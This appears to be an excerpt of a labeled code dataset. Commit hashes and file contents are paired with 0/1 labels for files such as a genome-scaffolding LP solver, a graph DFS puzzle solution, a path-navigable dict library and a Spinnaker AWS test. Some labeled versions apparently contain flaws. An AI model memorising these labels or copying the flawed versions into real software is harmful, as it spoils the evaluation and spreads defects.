    #         #for isize in self.isizes[(c1,c2)]:
    #         #    objective_value += math.log( normpdf(isize,mean,stddev) )
            
    #     return objective_value

    def make_path_dict_for_besst(self):
        path_dict = {}
        for ctg1,ctg2 in zip(self.ctgs[:-1],self.ctgs[1:]):
            path_dict[(ctg1,ctg2)] = ctg2.position - (ctg1.position + ctg1.length) - 1 
        #print path_dict
        return path_dict


    # def calc_probability_of_LP_solution(self, help_variables):
    #     log_prob = 0
    #     for (i,j,is_PE_link),variable in help_variables.iteritems():
    #         print self.contamination_ratio * self.observations[(i,j,is_PE_link)][1] * normpdf(variable.varValue,self.contamination_mean,self.contamination_stddev)
    #         if is_PE_link:
    #             try:
    #                 log_prob += math.log(self.contamination_ratio * self.observations[(i,j,is_PE_link)][1] * normpdf(variable.varValue,self.contamination_mean,self.contamination_stddev)) 
    #             except ValueError:
    #                 log_prob += - float(""inf"")
    #         else:
    #             try:
    #                 log_prob += math.log((1 - self.contamination_ratio) * self.observations[(i,j,is_PE_link)][1]* normpdf(variable.varValue,self.contamination_mean,self.contamination_stddev)) 
    #             except ValueError:
    #                 log_prob += - float(""inf"")
    #     return log_prob

    def LP_solve_gaps(self,param):
        exp_means_gapest = {}

        for (i,j,is_PE_link) in self.observations:
            mean_obs = self.observations[(i,j,is_PE_link)][0]
            if is_PE_link:
                exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
                #print 'GAPEST:',mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)

            else:
                if param.lognormal:
                    samples =  self.observations[(i,j,is_PE_link)][3]
                    exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + lnpe.GapEstimator(param.lognormal_mean, param.lognormal_sigma, self.read_len, samples, self.ctgs[i].length, c2_len=self.ctgs[j].length)
                else:
                    exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
                    #print 'GAPEST:',mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
        

        if all(length in self.ctg_lengths for length in [670, 2093]) or all(length in self.ctg_lengths for length in [900, 3810]) or all(length in self.ctg_lengths for length in [2528, 591]) or all(length in self.ctg_lengths for length in [734, 257, 1548]):

            for (i,j,is_PE_link) in self.observations:
                mean_obs = self.observations[(i,j,is_PE_link)][0]
                if is_PE_link:
                    #exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
                    print >> param.information_file, 'GAPEST:',mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)

                else:
                    #exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
                    print >> param.information_file, 'GAPEST:',mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)


        ####################
        ####### NEW ########
        ####################
        
        # convert problem to standard form 
        #  minimize    z = c' x
        # subject to  A x = b, x >= 0
        # b does not neccessarily need to be a positive vector

        # decide how long rows.
        # we need 2*g gap variables because they can be negative
        # and r help variables because absolute sign in objective function

        t = LpForm()  

        g = len(self.ctgs)-1
        r = len(self.observations)
        n = 2*g+r 

        #A = []
        #c = []
        #b = []
        # add  gap variable constraints g_i = x_i - y_i <= mean + 2stddev, x_i,y_i >= 0
        # gap 0 on column 0, gap1 on column 1 etc.

        for i in range(g):
            row = [0]*n
            row[2*i] = 1      # x_i
            row[2*i+1] = -1   # y_i
            #A.append(row)
            #b.append(self.mean + 2*self.stddev)
            t.add_constraint(row, self.mean + 2*self.stddev)

        # add r help variable constraints (for one case in absolute value)
        for h_index,(i,j,is_PE_link) in enumerate(self.observations):
            row = [0]*n
            
            # g gap variable constants
            for k in range(n):
                if i<= k <j:
                    row[2*k] = -1
                    row[2*k+1] =  1
            
            # r Help variables
            row[ 2*g + h_index] = -1

            # sum of ""inbetween"" contig lengths + observation
            constant =   sum(map(lambda x: x.length, self.ctgs[i+1:j])) + self.observations[(i,j,is_PE_link)][0]
            predicted_distance = exp_means_gapest[(i,j,is_PE_link)]

            t.add_constraint(row, constant - predicted_distance)

        # add r help variable constraints (for the other case in absolute value)
        for h_index,(i,j,is_PE_link) in enumerate(self.observations):
            row = [0]*n
            
            # q gap variable constants
            for k in range(n):
                if i<= k <j:
                    row[2*k] = 1
                    row[2*k+1] = -1
            
            # r Help variables
            row[ 2*g + h_index] = -1

            # sum of ""inbetween"" contig lengths + observation
            constant = sum(map(lambda x: x.length, self.ctgs[i+1:j])) + self.observations[(i,j,is_PE_link)][0]
            predicted_distance = exp_means_gapest[(i,j,is_PE_link)]

            t.add_constraint(row, predicted_distance - constant )

        # add objective row

        # calculate the total penalties of discrepancies of stddevs given assigned orientations
        # of all edges
        obj_delta_stddev = 0
        if self.contamination_ratio:
            obj_row = [0]*n
            for h_index,(i,j,is_PE_link) in enumerate(self.observations):
                n = self.observations[(i,j,is_PE_link)][1]
                obs_stddev = self.observations[(i,j,is_PE_link)][2]
                if is_PE_link:
                    obj_delta_stddev += abs(self.contamination_stddev - obs_stddev) * n
                else:
                    obj_delta_stddev += abs(self.stddev - obs_stddev) * n

                obj_row[ 2*g + h_index] = is_PE_link * n + (1-is_PE_link) * n
                #obj_row[ 2*g + h_index] = is_PE_link*self.stddev*n + (1-is_PE_link)*self.contamination_stddev * n

                #obj_row[ 2*g + h_index] = is_PE_link * self.stddev  * self.observations[(i,j,is_PE_link)][1] +  (1-is_PE_link) * self.contamination_stddev * self.observations[(i,j,is_PE_link)][1]
                # obj_row[ 2*g + h_index] = is_PE_link * self.stddev * (1 - self.contamination_ratio) * self.observations[(i,j,is_PE_link)][1] +  (1-is_PE_link) * self.contamination_stddev * (self.contamination_ratio)*self.observations[(i,j,is_PE_link)][1]
                t.add_objective(obj_row)
        else:
            obj_row = [0]*n
            for h_index,(i,j,is_PE_link) in enumerate(self.observations):
                obj_row[ 2*g + h_index] = self.observations[(i,j,is_PE_link)][1]
                t.add_objective(obj_row)

        A, b, c = t.standard_form()

        # sol_lsq =np.linalg.lstsq(A,b)
        # print ""LEAST SQUARES SOLUTION:""
        # print sol_lsq[0]

        #t.display()

        # print 'Objective:', c 
        # for row in A:
        #     print 'constraint:', row
        # print 'constnts:', b
        lpsol = lp_solve(c,A,b,tol=1e-4)
        optx = lpsol.x
        # zmin = lpsol.fun
        # bounded = lpsol.is_bounded
        # solvable = lpsol.is_solvable
        # basis = lpsol.basis
        # print "" ---->""
        # print ""optx:"",optx
        # print ""zmin:"",zmin
        # print ""bounded:"",bounded
        # print ""solvable:"",solvable
        # print ""basis:"",basis
        # print ""-------------------------------------------""

        # print ""LP SOLUTION:""
        # print optx

        # transform solutions to gaps back
        gap_solution = []
        for i in range(g):
            gap_solution.append( round (optx[2*i] -optx[2*i +1],0) )           

        self.objective = lpsol.fun

        # also add the penalties from the observed standard deviations
        #self.objective += obj_delta_stddev
        
        ctg_lengths = map(lambda x: x.length, self.ctgs)
        if 1359 in ctg_lengths and 673 in ctg_lengths: #len(path.gaps) >= 4:
            print 'Obj:',self.objective
            print ""of which stddev contributing:"", obj_delta_stddev
        #print ""objective:"",self.objective
        
        return gap_solution

    def __str__(self):
        string= ''
        for ctg in self.ctgs:
            string += 'c'+str(ctg.index) +',startpos:'+ str(ctg.position)+',endpos:'+str(ctg.position + ctg.length)+'\n'

        return string

        
# def ordered_search(path):

#     path.get_inferred_isizes()

#     for c1 in range(len(path.ctgs)-1):
#         for c2 in range(c1+1,len(path.ctgs)):
#             if (c1,c2) in path.observations:
#                 suggested_path = path.new_state_for_ordered_search(c1,c2,path.mean,path.stddev)
#                 suggested_path.update_positions()
#                 suggested_path.get_inferred_isizes()
#                 suggested_path.calc_dist_objective()
#                 if suggested_path.calc_dist_objective() < path.calc_dist_objective():
#                     #print ""SWITCHED PATH TO SUGGESTED PATH!!""
#                     path = suggested_path
#                     #print path
#                 else:
#                     pass
#                     #print 'PATH not taken!'
#             else:
#                 continue
      
#     # print 'FINAL PATH:'
#     # print path
#     # print 'With likelihood: ', path.calc_log_likelihood(mean,stddev)  

#     return path



def main(contig_lenghts, observations, param):
    """"""
    contig_lenghts: Ordered list of integers which is contig lengths (ordered as contigs comes in the path)
    observations:  dictionary oflist of observations, eg for contigs c1,c2,c3
                    we can have [(c1,c2):[23, 33, 21],(c1,c3):[12,14,11],(c2,c3):[11,34,32]]
    """"""

    path = Path(contig_lenghts,observations, param)
    
    if path.observations == None:
        return None

    # ML_path = MCMC(path,mean,stddev)
    # ML_path = ordered_search(path,mean,stddev)

    optimal_LP_gaps = path.LP_solve_gaps(param)
    path.gaps = optimal_LP_gaps
    ctg_lengths = map(lambda x: x.length, path.ctgs)
    if all(length in ctg_lengths for length in [670, 2093]) or all(length in ctg_lengths for length in [900, 3810]) or all(length in ctg_lengths for length in [2528, 591]) or all(length in ctg_lengths for length in [734, 257, 1548]):  #len(path.gaps) >= 4:
        print >> param.information_file, 'Solution:', path.gaps
        print >> param.information_file, ""objective:"",path.objective
        print >> param.information_file, 'ctg lengths:', map(lambda x: x.length, path.ctgs)
        print >> param.information_file, 'mp links:', path.mp_links
        print >> param.information_file, 'pe links:', path.pe_links
        print >> param.information_file, 'PE relative freq', path.pe_links / (path.pe_links + path.mp_links)

    path.update_positions()

    # print 'MCMC path:'
    # print ML_path
    # print 'MCMC path likelihood:',ML_path.calc_log_likelihood(mean,stddev)
    # print 'Ordered search path:'
    # print ML_path
    # print 'Ordered search likelihood:',ML_path.calc_log_likelihood(mean,stddev)
    # return ML_path

    return path

if __name__ == '__main__':
    contig_lenghts = [3000,500,500,500,3000]
    observations_normal = {(0,1):[1800,2000], (0,2):[1500,1800,1400,1700], (0,3):[1200,800,1000], 
                    (1,2):[750,800],(1,3):[600,700], (1,4):[300,600,700],
                    (2,3):[700,750], (2,4):[1400,1570],
                    (3,4):[2000,1750], }

    observations_linear = {(0,1):[450,500],  (1,2):[750,800],
                    (2,3):[700,750], (3,4):[400,170]}

    # The imortance of support:
    # one edge with a lot of observatins contradicting the others
    observations_matter = {(0,1):[450,500],  (1,2):[750,800],
                    (2,3):[700,750], (3,4):[400,170],
                    (0,4):[700]*30 }

    # long contig, 500bp gap, 3*short_contigs, long contig
    observations = {(0,1):[1450,1300,1200,1570], (0,2):[700,800,1000], (0,3):[250,300],
                    (1,2):[900],(1,3):[900,800], (1,4):[800,900,1000],
                    (2,3):[900], (2,4):[900,800],
                    (3,4):[1500,1750,1350,1900,1950] }

    # negative gaps test case here:

 
    mean = 1500
    stddev = 500
    read_len = 100
    main(contig_lenghts,observations,mean,stddev, read_len)


/n/n/n",1
202,61030520bead0397546f323807a7caa76f30ed0f,"flowerytrails.py/n/nimport sys

sys.setrecursionlimit(3000)


def inp():
    first_line = input().split("" "")
    num_points, num_trails = int(first_line[0]), int(first_line[1])
    adj_lst = {i: set() for i in range(num_points)}
    trail_len = {}
    trail_len_duplicate_count = {}
    for i in range(num_trails):
        trail = input().split("" "")
        node1, node2, length = int(trail[0]), int(trail[1]), int(trail[2])
        if node1 != node2:
            adj_lst[node1].add(node2)
            adj_lst[node2].add(node1)
            key = frozenset((node1, node2))
            if key in trail_len and length >= trail_len[key]:
                trail_len_duplicate_count[key] += 1 if length == trail_len[key] else 0
            else:
                trail_len[key] = length
                trail_len_duplicate_count[key] = 1
    return num_points, adj_lst, trail_len, trail_len_duplicate_count


def main():
    num_points, adj_lst, trail_len, trail_len_duplicate_count = inp()
    # print(adj_lst)
    # print(trail_len)
    # print(trail_len_duplicate_count)
    shortest_path = sum(trail_len.values())
    flower_path = set(trail_len.keys())

    def dfs_recur(current_node, path, length):
        # print(path)
        nonlocal shortest_path, flower_path
        if current_node == num_points - 1:
            edges = [frozenset((path[i], path[i+1])) for i in range(len(path) - 1)]
            length = sum(trail_len[edge] for edge in edges)
            if length < shortest_path:
                flower_path = set(edges)
                shortest_path = length
            elif length == shortest_path:
                flower_path = flower_path.union(edges)
        else:
            for node in adj_lst[current_node]:
                edge_len = trail_len[frozenset((current_node, node))]
                if node not in path and length + edge_len <= shortest_path:
                    path.append(node)
                    dfs_recur(node, path, length + edge_len)
                    path.pop()

    dfs_recur(0, [0], 0)
    # print(flower_path)
    return sum(trail_len[path] * trail_len_duplicate_count[path] for path in flower_path) * 2

if __name__ == '__main__':
    print(main())
/n/n/n",0
203,61030520bead0397546f323807a7caa76f30ed0f,"/flowerytrails.py/n/ndef inp():
    first_line = input().split("" "")
    num_points, num_trails = int(first_line[0]), int(first_line[1])
    adj_lst = {i: set() for i in range(num_points)}
    trail_len = {}
    trail_len_duplicate_count = {}
    for i in range(num_trails):
        trail = input().split("" "")
        node1, node2, length = int(trail[0]), int(trail[1]), int(trail[2])
        if node1 != node2:
            adj_lst[node1].add(node2)
            adj_lst[node2].add(node1)
            key = frozenset((node1, node2))
            if key in trail_len and length >= trail_len[key]:
                trail_len_duplicate_count[key] += 1 if length == trail_len[key] else 0
            else:
                trail_len[key] = length
                trail_len_duplicate_count[key] = 1
    return num_points, adj_lst, trail_len, trail_len_duplicate_count


def main():
    num_points, adj_lst, trail_len, trail_len_duplicate_count = inp()
    # print(adj_lst)
    # print(trail_len)
    # print(trail_len_duplicate_count)
    shortest_path = sum(trail_len.values())
    flower_path = set(trail_len.keys())

    def dfs_recur(current_node, path):
        # print(path)
        nonlocal shortest_path, flower_path
        if current_node == num_points - 1:
            edges = [frozenset((path[i], path[i+1])) for i in range(len(path) - 1)]
            length = sum(trail_len[edge] for edge in edges)
            if length < shortest_path:
                flower_path = set(edges)
                shortest_path = length
            elif length == shortest_path:
                flower_path = flower_path.union(edges)
        else:
            for node in adj_lst[current_node]:
                if node not in path:
                    path.append(node)
                    dfs_recur(node, path)
                    path.pop()

    dfs_recur(0, [0])
    # print(flower_path)
    return sum(trail_len[path] * trail_len_duplicate_count[path] for path in flower_path) * 2

if __name__ == '__main__':
    print(main())
/n/n/n",1
204,e8d6187a90bc3a3fc7bbdc035f654a68e5b095a1,"texas.py/n/nimport collections.abc
__version__ = ""0.3""

MISSING = object()
DEFAULT_PATH_SEPARATOR = "".""


def raise_on_missing(sep, visited, **kwargs):
    """"""Raise the full path of the missing key""""""
    raise KeyError(sep.join(visited))


def create_on_missing(factory):
    """"""
    Returns a function to pass to traverse to create missing nodes.

    Usage
    -----
    # This will insert dicts on missing keys
    root = {}
    path = ""hello.world.foo.bar""
    on_missing = create_on_missing(dict)
    node, last = traverse(root, path, sep=""."", on_missing=on_missing)
    print(root)  # {""hello"": {""world"": {""foo"": {}}}}
    print(node)  # {}
    print(last)  # ""bar""
    assert root[""hello""][""world""][""foo""] is node
    """"""
    def on_missing(**kwargs):
        return factory()
    return on_missing


def default_context_factory():
    """"""
    By default, Context creates a PathDict for each context.

    Each of those PathDicts will use regular dicts for storage.
    """"""
    return lambda: PathDict(path_factory=dict,
                            path_separator=DEFAULT_PATH_SEPARATOR)


def traverse(root, path, sep, on_missing=raise_on_missing):
    """"""
    Returns a (node, key) of the last node in the chain and its key.

    sep: splitting character in the path
    on_missing: func that takes (node, key, visited, sep) and returns a
                new value for the missing key or raises.
    """"""
    visited = []
    node = root
    *segments, last = path.split(sep)
    for segment in segments:
        # Skip empty segments - collapse ""foo..bar.baz"" into ""foo.bar.baz""
        if not segment:
            continue
        visited.append(segment)
        child = node.get(segment, MISSING)
        if child is MISSING:
            # pass by keyword so functions may ignore variables
            new = on_missing(node=node, key=segment, visited=visited, sep=sep)
            # insert new node if the on_missing function didn't raise
            child = node[segment] = new
        node = child
    return [node, last]


class PathDict(collections.abc.MutableMapping):
    """"""Path navigable dict, inserts missing nodes during set.

    Args:
        path_separator (Optional[str]):
            string that separates each segment of
            a path.  Defaults to "".""
        path_factory (Callable[[], collections.abc.MutableMapping]):
            no-arg function that returns an object that implements the
            mapping interface.  Used to fill missing segments when
            setting values.  Defaults to dict.

    Usage:

        >>> config = PathDict(path_separator=""/"")
        >>> config[""~/ws/texas""] = [""tox.ini"", "".travis.yml""]
        >>> config[""~/ws/bloop""] = ["".gitignore""]
        >>> print(config[""~/ws""])
        {'bloop': ['.gitignore'], 'texas': ['tox.ini', '.travis.yml']}

    """"""
    def __init__(self, *args,
                 path_separator=DEFAULT_PATH_SEPARATOR,
                 path_factory=dict,
                 **kwargs):
        self._sep = path_separator
        self._data = {}
        self._create_on_missing = create_on_missing(path_factory)
        self.update(*args, **kwargs)

    def __setitem__(self, path, value):
        if self._sep not in path:
            self._data[path] = value
        else:
            node, key = traverse(self, path, sep=self._sep,
                                 on_missing=self._create_on_missing)
            node[key] = value

    def __getitem__(self, path):
        if self._sep not in path:
            return self._data[path]
        else:
            node, key = traverse(self, path, sep=self._sep,
                                 on_missing=raise_on_missing)
            return node[key]

    def __delitem__(self, path):
        if self._sep not in path:
            del self._data[path]
        else:
            node, key = traverse(self, path, sep=self._sep,
                                 on_missing=raise_on_missing)
            del node[key]

    def __iter__(self):
        return iter(self._data)

    def __len__(self):
        return len(self._data)

    def __repr__(self):  # pragma: no cover
        return ""PathDict("" + repr(dict(self)) + "")""


class Context:
    def __init__(self, factory=None):
        self._factory = factory or default_context_factory()
        self._contexts = self._factory()

    def _get_context(self, name):
        try:
            return self._contexts[name]
        except KeyError:
            context = self._contexts[name] = self._factory()
            return context

    def include(self, *names, contexts=None):
        contexts = list(contexts) if (contexts is not None) else []
        contexts.extend(self._get_context(name) for name in names)
        return ContextView(self, contexts)


class ContextView(collections.abc.MutableMapping):
    def __init__(self, context, contexts):
        self.contexts = contexts
        self.context = context

    def __enter__(self):
        return self

    def __exit__(self, *args):
        pass

    @property
    def current(self):
        return self.contexts[-1]

    def include(self, *names):
        return self.context.include(*names, contexts=self.contexts)

    def __getitem__(self, path):
        for context in reversed(self.contexts):
            value = context.get(path, MISSING)
            if value is not MISSING:
                return value
        raise KeyError(path)

    def __setitem__(self, path, value):
        self.current[path] = value

    def __delitem__(self, path):
        del self.current[path]

    def __len__(self):
        return len(self.current)

    def __iter__(self):
        return iter(self.current)
/n/n/n",0
205,e8d6187a90bc3a3fc7bbdc035f654a68e5b095a1,"/texas.py/n/nimport collections.abc
__version__ = ""0.3""

MISSING = object()
DEFAULT_PATH_SEPARATOR = "".""


def raise_on_missing(sep, visited, **kwargs):
    """"""Raise the full path of the missing key""""""
    raise KeyError(sep.join(visited))


def create_on_missing(factory):
    """"""
    Returns a function to pass to traverse to create missing nodes.

    Usage
    -----
    # This will insert dicts on missing keys
    root = {}
    path = ""hello.world.foo.bar""
    on_missing = create_on_missing(dict)
    node, last = traverse(root, path, sep=""."", on_missing=on_missing)
    print(root)  # {""hello"": {""world"": {""foo"": {}}}}
    print(node)  # {}
    print(last)  # ""bar""
    assert root[""hello""][""world""][""foo""] is node
    """"""
    def on_missing(**kwargs):
        return factory()
    return on_missing


def default_context_factory():
    """"""
    By default, Context creates a PathDict for each context.

    Each of those PathDicts will use regular dicts for storage.
    """"""
    return lambda: PathDict(path_factory=dict,
                            path_separator=DEFAULT_PATH_SEPARATOR)


def traverse(root, path, sep, on_missing=raise_on_missing):
    """"""
    Returns a (node, key) of the last node in the chain and its key.

    sep: splitting character in the path
    on_missing: func that takes (node, key, visited, sep) and returns a
                new value for the missing key or raises.
    """"""
    visited = []
    node = root
    *segments, last = path.split(sep)
    for segment in segments:
        # Skip empty segments - collapse ""foo..bar.baz"" into ""foo.bar.baz""
        if not segment:
            continue
        visited.append(segment)
        child = node.get(segment, MISSING)
        if child is MISSING:
            # pass by keyword so functions may ignore variables
            new = on_missing(node=node, key=segment, visited=visited, sep=sep)
            # insert new node if the on_missing function didn't raise
            child = node[segment] = new
        node = child
    return [node, last]


class PathDict(collections.abc.MutableMapping):
    """"""Path navigable dict, inserts missing nodes during set.

    Args:
        path_separator (Optional[str]):
            string that separates each segment of
            a path.  Defaults to "".""
        path_factory (Callable[[], collections.abc.MutableMapping]):
            no-arg function that returns an object that implements the
            mapping interface.  Used to fill missing segments when
            setting values.  Defaults to dict.

    Usage:

        >>> config = PathDict(path_separator=""/"")
        >>> config[""~/ws/texas""] = [""tox.ini"", "".travis.yml""]
        >>> config[""~/ws/bloop""] = ["".gitignore""]
        >>> print(config[""~/ws""])
        {'bloop': ['.gitignore'], 'texas': ['tox.ini', '.travis.yml']}

    """"""
    def __init__(self, *args,
                 path_separator=DEFAULT_PATH_SEPARATOR,
                 path_factory=dict,
                 **kwargs):
        self._sep = path_separator
        self._data = {}
        self._create_on_missing = create_on_missing(path_factory)
        self.update(*args, **kwargs)

    def __setitem__(self, path, value):
        node, key = traverse(self, path, sep=self._sep,
                             on_missing=self._create_on_missing)
        if node is self:
            self._data[key] = value
        else:
            node[key] = value

    def __getitem__(self, path):
        node, key = traverse(self, path, sep=self._sep,
                             on_missing=raise_on_missing)
        if node is self:
            return self._data[key]
        else:
            return node[key]

    def __delitem__(self, path):
        node, key = traverse(self, path, sep=self._sep,
                             on_missing=raise_on_missing)
        if node is self:
            del self._data[key]
        else:
            del node[key]

    def __iter__(self):
        return iter(self._data)

    def __len__(self):
        return len(self._data)

    def __repr__(self):  # pragma: no cover
        return ""PathDict("" + repr(dict(self)) + "")""


class Context:
    def __init__(self, factory=None):
        self._factory = factory or default_context_factory()
        self._contexts = self._factory()

    def _get_context(self, name):
        try:
            return self._contexts[name]
        except KeyError:
            context = self._contexts[name] = self._factory()
            return context

    def include(self, *names, contexts=None):
        contexts = list(contexts) if (contexts is not None) else []
        contexts.extend(self._get_context(name) for name in names)
        return ContextView(self, contexts)


class ContextView(collections.abc.MutableMapping):
    def __init__(self, context, contexts):
        self.contexts = contexts
        self.context = context

    def __enter__(self):
        return self

    def __exit__(self, *args):
        pass

    @property
    def current(self):
        return self.contexts[-1]

    def include(self, *names):
        return self.context.include(*names, contexts=self.contexts)

    def __getitem__(self, path):
        for context in reversed(self.contexts):
            value = context.get(path, MISSING)
            if value is not MISSING:
                return value
        raise KeyError(path)

    def __setitem__(self, path, value):
        self.current[path] = value

    def __delitem__(self, path):
        del self.current[path]

    def __len__(self):
        return len(self.current)

    def __iter__(self):
        return iter(self.current)
/n/n/n",1
206,1380da4269899ce1e395f4f6574fb16f8c0a5649,"spinnaker_system/aws_kato_test.py/n/n# Copyright 2015 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Tests to see if CloudDriver/Kato can interoperate with Amazon Web Services.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400):
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)
    and $AWS_PROFILE is the name of the aws_cli profile for authenticating
    to observe aws resources:

    This first command would be used if Spinnaker itself was deployed on GCE.
    The test needs to talk to GCE to get to spinnaker (using the gce_* params)
    then talk to AWS (using the aws_profile with the aws cli program) to
    verify Spinnaker had the right effects on AWS.

    PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
       python $CITEST_ROOT/spinnaker/spinnaker_system/aws_kato_test.py \
       --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
       --gce_project=$PROJECT \
       --gce_zone=$GCE_ZONE \
       --gce_instance=$INSTANCE \
       --test_aws_zone=$AWS_ZONE \
       --aws_profile=$AWS_PROFILE

   or

     This second command would be used if Spinnaker itself was deployed some
     place reachable through a direct IP connection. It could be, but is not
     necessarily deployed on GCE. It is similar to above except it does not
     need to go through GCE and its firewalls to locate the actual IP endpoints
     rather those are already known and accessible.

     PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
       python $CITEST_ROOT/spinnaker/spinnaker_system/aws_kato_test.py \
       --native_hostname=host-running-kato
       --test_aws_zone=$AWS_ZONE \
       --aws_profile=$AWS_PROFILE

   Note that the $AWS_ZONE is not directly used, rather it is a standard
   parameter being used to infer the region. The test is going to pick
   some different availability zones within the region in order to test kato.
   These are currently hardcoded in.
""""""

# Standard python modules.
import sys

# citest modules.
import citest.aws_testing as aws
import citest.json_predicate as jp
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.kato as kato


class AwsKatoTestScenario(sk.SpinnakerTestScenario):
  """"""Defines the scenario for the test.

  This scenario defines the different test operations.
  We're going to:
    Create a Load Balancer
    Delete a Load Balancer
  """"""

  __use_lb_name = ''     # The load balancer name.

  @classmethod
  def new_agent(cls, bindings):
    """"""Implements the base class interface to create a new agent.

    This method is called by the base classes during setup/initialization.

    Args:
      bindings: The bindings dictionary with configuration information
        that this factory can draw from to initialize. If the factory would
        like additional custom bindings it could add them to initArgumentParser.

    Returns:
      A citest.service_testing.BaseAgent that can interact with Kato.
      This is the agent that test operations will be posted to.
    """"""
    return kato.new_agent(bindings)

  def upsert_load_balancer(self):
    """"""Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on AWS. See
    the contract builder for more info on what the expectations are.
    """"""
    detail_raw_name = 'katotestlb' + self.test_id
    self.__use_lb_name = detail_raw_name

    bindings = self.bindings
    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    listener = {
        'Listener': {
            'InstancePort':7001,
            'LoadBalancerPort':80
        }
    }
    health_check = {
        'HealthyThreshold':8,
        'UnhealthyThreshold':3,
        'Interval':123,
        'Timeout':12,
        'Target':'HTTP:%d/healthcheck' % listener['Listener']['InstancePort']
    }

    payload = self.agent.type_to_payload(
        'upsertAmazonLoadBalancerDescription',
        {
            'credentials': bindings['AWS_CREDENTIALS'],
            'clusterName': bindings['TEST_APP'],
            'name': detail_raw_name,
            'availabilityZones': {region: avail_zones},
            'listeners': [{
                'internalProtocol': 'HTTP',
                'internalPort': listener['Listener']['InstancePort'],
                'externalProtocol': 'HTTP',
                'externalPort': listener['Listener']['LoadBalancerPort']
            }],
            'healthCheck': health_check['Target'],
            'healthTimeout': health_check['Timeout'],
            'healthInterval': health_check['Interval'],
            'healthyThreshold': health_check['HealthyThreshold'],
            'unhealthyThreshold': health_check['UnhealthyThreshold']
        })

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Added', retryable_for_secs=30)
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', self.__use_lb_name])
     .contains_pred_list([
         jp.PathContainsPredicate(
             'LoadBalancerDescriptions/HealthCheck', health_check),
         jp.PathPredicate(
             'LoadBalancerDescriptions/AvailabilityZones{0}'.format(
                 jp.DONT_ENUMERATE_TERMINAL),
             jp.LIST_SIMILAR(avail_zones)),
         jp.PathElementsContainPredicate(
             'LoadBalancerDescriptions/ListenerDescriptions', listener)
         ])
    )

    return st.OperationContract(
        self.new_post_operation(
            title='upsert_amazon_load_balancer', data=payload, path='ops'),
        contract=builder.build())

  def delete_load_balancer(self):
    """"""Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the AWS resources
    created by upsert_load_balancer are no longer visible on AWS.
    """"""
    region = self.bindings['TEST_AWS_REGION']
    payload = self.agent.type_to_payload(
        'deleteAmazonLoadBalancerDescription',
        {
            'credentials': self.bindings['AWS_CREDENTIALS'],
            'regions': [region],
            'loadBalancerName': self.__use_lb_name
        })

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Removed')
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', self.__use_lb_name],
         no_resources_ok=True)
     .excludes_path_value('LoadBalancerName', self.__use_lb_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_amazon_load_balancer', data=payload, path='ops'),
        contract=builder.build())


class AwsKatoIntegrationTest(st.AgentTestCase):
  """"""The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the AwsKatoTestScenario.
  """"""
  # pylint: disable=missing-docstring

  def test_a_upsert_load_balancer(self):
    self.run_test_case(self.scenario.upsert_load_balancer())

  def test_z_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer())


def main():
  """"""Implements the main method running this smoke test.""""""

  defaults = {
      'TEST_APP': 'awskatotest' + AwsKatoTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      AwsKatoTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[AwsKatoIntegrationTest])


if __name__ == '__main__':
  sys.exit(main())
/n/n/nspinnaker_system/aws_smoke_test.py/n/n# Copyright 2016 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
